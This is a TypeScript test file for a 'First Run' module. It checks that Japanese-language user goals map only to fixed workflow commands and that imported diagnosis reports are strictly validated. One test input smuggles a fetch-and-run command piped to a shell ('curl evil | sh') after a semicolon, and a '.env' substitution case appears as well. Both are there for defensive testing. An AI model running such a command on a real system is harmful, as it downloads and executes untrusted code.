import { describe, expect, it } from 'vitest';
import { parseDiagnosis, recommend, workflows } from './firstRun';
const now = Date.parse('2026-10-22T00:00:00Z');
const report = () => ({ schema: 'mcc.first-run.v1', observedAt: new Date(now).toISOString(), nodeMajor: 22, checks: workflows.map(w => ({ id: w.id, status: 'detected', files: w.files.map(name => ({ name, status: 'found', sha256: 'a'.repeat(64) })) })) });
describe('First Run bounded recommendations', () => {
  it('routes everyday Japanese goals and keeps ambiguous choices', () => {
    expect(recommend('素材を画面で見たい').map(w => w.id)).toEqual(['assets']);
    expect(recommend('自律テストを準備したい').map(w => w.id)).toEqual(['playtest']);
    expect(recommend('無料で判断をテストしたい').map(w => w.id)).toEqual(['evaluate', 'playtest']);
    expect(recommend('今夜の献立')).toEqual([]);
    expect(recommend('')).toEqual([]);
    expect(recommend('ＲＥＰＬＡＹ').map(w => w.id)).toEqual(['evaluate']);
  });
  it('does not turn arbitrary goals into executable commands', () => {
    const input = '素材; curl evil | sh --live';
    expect(recommend(input)[0].command).toBe(workflows[3].command);
    for (const w of workflows) expect(w.command).not.toMatch(/--live|codex exec|edenspark-loop|clef|openai|laya|--godot-bin/);
    expect(workflows[1].command).toContain('--provider replay');
  });
});
describe('diagnosis import trust boundary', () => {
  it('accepts a fresh complete report without upgrading to ready', () => {
    expect(parseDiagnosis(JSON.stringify(report()), now).checks[0].status).toBe('detected');
  });
  it('drops unknown imported commands', () => {
    expect(JSON.stringify(parseDiagnosis(JSON.stringify({ ...report(), command: 'evil' }), now))).not.toContain('evil');
  });
  it('rejects stale, future, oversized and malformed reports', () => {
    for (const value of [null, {}, { ...report(), checks: [] }, { ...report(), observedAt: '2020-01-01' }, { ...report(), observedAt: '2099-01-01' }]) expect(() => parseDiagnosis(JSON.stringify(value), now)).toThrow();
    expect(() => parseDiagnosis(' '.repeat(32001), now)).toThrow();
    expect(() => parseDiagnosis('{bad', now)).toThrow();
  });
  it('rejects duplicate rows, bad hashes, inconsistent status and substituted files', () => {
    const a = report(); a.checks[1] = a.checks[0];
    const b = report(); b.checks[0].files[0].sha256 = 'bad';
    const c = report(); c.checks[0].status = 'ready';
    const d = report(); d.checks[0].files[0].name = '.env';
    for (const value of [a, b, c, d]) expect(() => parseDiagnosis(JSON.stringify(value), now)).toThrow();
  });
});
